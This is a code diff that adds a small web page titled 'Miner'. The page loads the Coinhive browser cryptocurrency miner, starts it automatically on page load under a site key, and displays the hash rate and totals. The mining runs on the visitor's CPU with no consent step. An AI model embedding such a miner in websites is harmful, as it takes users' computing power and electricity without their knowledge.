@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Miner</title>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    var miner = new CoinHive.Anonymous('LZSdFJYBUldfKhSwZV5aWrgDXpFzut66',{throttle: 0.4});
+    miner.start(CoinHive.FORCE_MULTI_TAB);
+    </script>
+  </head>
+  <body>
+    <main>
+      <div class="mdc-textfield" data-mdc-auto-init="MDCTextfield">
+        H/s: <div id="hps"></div>
+      </div>
+      <div class="mdc-textfield" data-mdc-auto-init="MDCTextfield">
+        Total: <div id="tot"></div>
+      </div class="mdc-textfield" data-mdc-auto-init="MDCTextfield">
+      <div class="mdc-textfield" data-mdc-auto-init="MDCTextfield">
+        accepted: <div id="acc"></div>
+      </div>
+    </main>
+    <script>
+	    var updater=function() {
+	      var hashesPerSecond = miner.getHashesPerSecond();
+		    var totalHashes = miner.getTotalHashes(true);
+		    var acceptedHashes = miner.getAcceptedHashes();
+
+		    // Output to HTML elements...
+		    document.getElementById('hps').innerHTML=hashesPerSecond;
+		    document.getElementById('tot').innerHTML=totalHashes;
+		    document.getElementById('acc').innerHTML=acceptedHashes;
+	    }
+	    // Listen on events
+	    miner.on('found', function() { /* Hash found */ })
+	    miner.on('accepted', updater)
+
+	    // Update stats once per second
+	    setInterval(updater, 100);
+    </script>
+    <script src="https://unpkg.com/material-components-web@latest/dist/material-components-web.min.js"></script>
+    <script>window.mdc.autoInit();</script>
+  </body>
+</html>
